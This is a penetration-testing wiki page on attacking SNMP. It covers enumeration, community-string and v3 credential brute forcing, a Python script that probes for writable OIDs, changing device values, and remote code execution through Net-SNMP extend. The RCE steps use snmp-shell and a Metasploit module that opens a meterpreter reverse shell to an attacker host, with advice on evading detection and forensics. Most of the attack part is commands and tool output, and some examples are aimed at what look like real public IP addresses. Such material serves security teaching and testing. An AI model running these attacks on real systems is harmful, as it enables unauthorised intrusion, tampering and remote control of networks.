---
authors: ShutdownRepo, 0xbugatti
---
# 🛠️ SNMP

Simple Network/Host management protocol
# `161,162,1061,1062 UDP`



### GET A  Look

IN Router :  Show You A full Mapping Of Network 
Every single End point :switch, host, firewall Of network & Packets flow

IN Host  :  Show You A full Mapping Every single Action  in  the                                                                 host: Open Ports , Processes[Running exes], Installed Software, Accounts

::: details How is it work
### How is it work

- It’s based on A Manager- Agent Manager has information
- Has  Database Called MIB stands for management Information Database
- MIB (Database) Contains some digits called OID which translated to the information 
OID EX: iso.3.6.1.2.1.1.9.1.4.5
-  v1 is different than 2 ,2c,and 3 [in  authentication method and Data transfer encryption]
- V1-2-2c Uses Community strings to 
     Authenticate (By use it as password)  Authorize (By specify different privileges for Every  password)
- V3 Uses User and password and Passphrase to Authenticate  Authorize and TLS Encryption added

---
:::

::: details  Used For

-   management
-   monitoring
-   Blueteaming Detect Threats
-   Administration
:::
  

### **Common Default Credentials in V1/2/2c**

Read-Only Permission : `public`

Read-Write Permission: `private`
### **Enumeration**

FOR Unknown Version`snmp-check 91.216.192.182 -c public -p 161`

FOR Triaging OIDs `snmpwalk 91.216.192.182 -c public -v 1|2c`

FOR Cool Output       `metasploit`

```bash
msf6 > use auxiliary/scanner/snmp/snmp_enum
msf6 auxiliary(scanner/snmp/snmp_enum) > show options

Module options (auxiliary/scanner/snmp/snmp_enum):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   COMMUNITY  public           yes       SNMP Community String
   RETRIES    1                yes       SNMP Retries
   RHOSTS                      yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT      161              yes       The target port (UDP)
   THREADS    1                yes       The number of concurrent threads (max one per host)
   TIMEOUT    1                yes       SNMP Timeout
   VERSION    1                yes       SNMP Version <1/2c>

msf6 auxiliary(scanner/snmp/snmp_enum) > set RHOSTS 192.2.1.182
msf6 auxiliary(scanner/snmp/snmp_enum) > run
```

**Recommendation For Best Output Format** 

https://github.com/SECFORCE/SNMP-Brute

`python snmp_brute.py -t 91.216.192.182 -p 161 --cisco|linux|windows -f test.txt`
### **v1-2-2c Authentication Brute Force Attack**

`onesixtyone -c dict.txt -w 100 -i host.txt`  

`onesixtyone -c dict.txt -w 100 IP.100.120.44`

**Recommendation**

https://github.com/SECFORCE/SNMP-Brute

`python snmp_brute.py -t 91.216.192.182 -p 161 --cisco|linux|windows -f test.txt`

### **v3 Authentication Brute Force Attack**
‣ **Installation**  [snmpwn](https://github.com/hatlord/snmpwn.git)
	  
```bash

git clone  https://github.com/hatlord/snmpwn.git
cd snmpwn
gem install bundler
bundle install
./snmpwn.rb

```

‣  `./snmpwn.rb --hosts hosts.txt --users users.txt --passlist passwords.txt --enclist passwords.txt`

### **Change Values in Machine by SET an OID Value**

- ‣ check your permission
    
    `snmp-check 91.216.192.182 -w -c private -p 161`
    
- ‣ check writable OID with python
    
    ```python
    #!/usr/bin/env python3
    
    import sys
    import re
    
    import shlex
    import subprocess
    from subprocess import PIPE
    
    #Debug flag
    debug = False
    
    #Display help 
    if len(sys.argv)==1 or sys.argv[1].lower()=="-h" or sys.argv[1].lower()=="--help":
        usage={}
        usage["desc"] = """Returns the number of writable OIDs and list them.
    Parses the output of 'snmpwalk' and determines all elements that are readable. The return code of 'snmpset' is used to determine if an element's value can be written, by performing a write with the exact actual value.
    """
        usage["cmd"] = f"Syntax:\t{sys.argv[0]} [OPTIONS] AGENT [PARAMETERS] #see man snmpcmd"
        usage["example"] = f"Example: {sys.argv[0]} -v 2c -c public 192.168.0.3"
        usage["disclaimer"] = """
    DISCLAIMAR: The script might change the value of the writable or cause other effects. Use with care.
    """ 
        print("\n".join(usage.values()))
        sys.exit(0)
    
    #Simply the command line options to snmpwalk and snmpset
    options_agent = ' '.join(sys.argv[1:])
    
    cmd = f"snmpwalk {options_agent}"
    args = shlex.split(cmd)
    proc = subprocess.Popen(args, stdout=subprocess.PIPE, stderr=subprocess.DEVNULL)
    out = proc.stdout.read().decode()
    
    if(debug):
        print(f"{cmd}\n{out}\n\n")
    
    #map between snmpwalk output and expected type by snmpset
    type_map = {"INTEGER":'i', "unsigned INTEGER":'u', "UNSIGNED":'u', "TIMETICKS":'t', "Timeticks":'t', "IPADDRESS":'a', "OBJID":'o', "OID":'o',  "STRING":'s', "HEX STRING":'x', "Hex-STRING":'x', "DECIMAL STRING":'d', "BITS":'b', "unsigned int64":'U', "signed int64":'I', "float":'F', "double":'D', "NULLOBJ":'n'}
    
    #count how many OIDs are writable
    count=0
    
    #Iterate and parse each OID
    for line in out.splitlines():
        try:
            oid = line.split(" = ")[0]
            type_value = line.split(" = ")[1]
            type_ = type_map[ type_value.split(": ")[0] ] #ex: STRING: "abc"
            value = type_value.split(": ")[1]
    
            #for TIMETICKS extract only the numeric value
            if type_ == 't':
                match = re.search('\((.+?)\)', value)
                if match:
                    value = match.group(1)
                else:
                    continue
            #for HEX STRING put the value in quotes
            if type_ == 'x':
                value = f'"{value}"'
    
            #Try to write the existing value once again        
            cmd = f"snmpset {options_agent} {oid} {type_} {value}"
            args = shlex.split(cmd)
            if(debug):
                print(cmd)
                retcode = subprocess.call(args)
            else:
                retcode = subprocess.call(args, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                
            if retcode == 0:
                cmd_get = f"snmpget {options_agent} {oid}"
                args_get = shlex.split(cmd_get)
                oidtype = subprocess.run(args_get, stdout=subprocess.PIPE).stdout.decode('utf-8')
                m = re.search('=', oidtype)
                oidtype_s = oidtype[m.end():]
                print(f"{oid} is writable - "f"{oidtype_s}")
                count+=1
        except:
            pass
    
    #return code is the number of found OIDs
    sys.exit(count)
    #by xorguy
    ```
    
    - **Usage**
    
    `python3 script.py -v 1|2c 192.168.0.3 -c public IP.100.123.1`
    
####  Writing 
- **translate OID**
	    `snmptranslate -On iso.3.6.1.2.1.1.4.0e`
    
- **revalue OID**
    - **braa** 	     `braa community@IP.151.20.3:port:.1.3.6.oid.9.1.4.5=newvalue` 
    - **metasploit**
    
```bash
    msf6>use scanner/snmp/snmp_set
    msf6 auxiliary(scanner/snmp/snmp_set) > show options 
    
    Module options (auxiliary/scanner/snmp/snmp_set):
    
       Name       Current Setting  Required  Description
       ----       ---------------  --------  -----------
       COMMUNITY  public           yes       SNMP Community String
       OID                         yes       The object identifier 
       OIDVALUE                    yes       The value to set
       RETRIES    1                yes       SNMP Retries
       RHOSTS                      yes       
       RPORT      161              yes       The target port (UDP)
       THREADS    1                yes       The number of concurrent threads
       TIMEOUT    1                yes       SNMP Timeout
       VERSION    1                yes       SNMP Version <1/2c>
       
    msf6 auxiliary(scanner/snmp/snmp_set) > set RHOSTS IP 
    msf6 auxiliary(scanner/snmp/snmp_set) > set VERSION 1 OR 2c 
    msf6 auxiliary(scanner/snmp/snmp_set) > set COMMUNITY privateasexampel 
    msf6 auxiliary(scanner/snmp/snmp_set) > set OID .1.3.ta.rg.et.oi.d.9.4.5
    msf6 auxiliary(scanner/snmp/snmp_set) > set OIDVALUE HACKED

```
    


> [!SUCCESS]  
> Here We Will talk about how to  gain shell access (RCE) from snmp
### **RCE Linux with Extend Net-SNMP (Net-SNMP-Extend-MIB)**

1. [snmpshell](https://github.com/mxrch/snmp-shell)

‣ **Installation** 

```bash

sudo apt install snmp snmp-mibs-downloader rlwrap -y
git clone https://github.com/mxrch/snmp-shell
cd snmp-shell
sudo python3 -m pip install -r requirements.txt
```

‣ Usage
 

```bash
python3 shell.py IP.12.123.10 -c privateasexaple -v 1|2c
Simulates a terminal over Net-SNMP "extend" functionality. Be sure your
SNMP Community String has write access.
-ss, --snmpset TEXT         Path for the snmpset binary
-sw, --snmpwalk TEXT        Path for the snmpwalk binary

```

2. **metasploit**

```bash
msf6>use scanner/snmp/snmp_set
msf6 exploit(linux/snmp/net_snmpd_rw_access) > show options 

Module options (exploit/linux/snmp/net_snmpd_rw_access):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   CHUNKSIZE  200              yes       Maximum bytes of payload to write at once
   COMMUNITY  public           yes       SNMP Community String
   FILEPATH   /tmp             yes       file path to write to
   RETRIES    1                yes       SNMP Retries
   RHOSTS     91.216.192.182   yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT      161              yes       The target port (TCP)
   SHELL      /bin/bash        yes       Shell to call with -c argument
   SRVHOST                     yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
   SRVPORT    8080             yes       The local port to listen on.
   SSL        false            no        Negotiate SSL for incoming connections
   SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)
   TIMEOUT    1                yes       SNMP Timeout
   URIPATH                     no        The URI to use for this exploit (default is random)
   VERSION    1                yes       SNMP Version <1/2c>

Payload options (linux/x86/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.1.4      yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port

Exploit target:

   Id  Name
   --  ----
   0   Linux x86
msf6 exploit(linux/snmp/net_snmpd_rw_access) >set SRVHOST [allow one ip (attacker ip) To Connect To Keep calm,clean and safe (Redteaming)]
msf6 exploit(linux/snmp/net_snmpd_rw_access) >set SSL [Ecnrypt Your Connection To Evade some Network Attack Detaction methods & Forensics]
msf6 exploit(linux/snmp/net_snmpd_rw_access) >set LHOST  192.168.1.4 [attacker IP will developed in shellcode]
msf6 exploit(linux/snmp/net_snmpd_rw_access) >set COMMUNITY  private          
msf6 exploit(linux/snmp/net_snmpd_rw_access) >set  RHOSTS     191.26.12.102
msf6 exploit(linux/snmp/net_snmpd_rw_access) > VERSION    1/2
msf6 exploit(linux/snmp/net_snmpd_rw_access) >run
```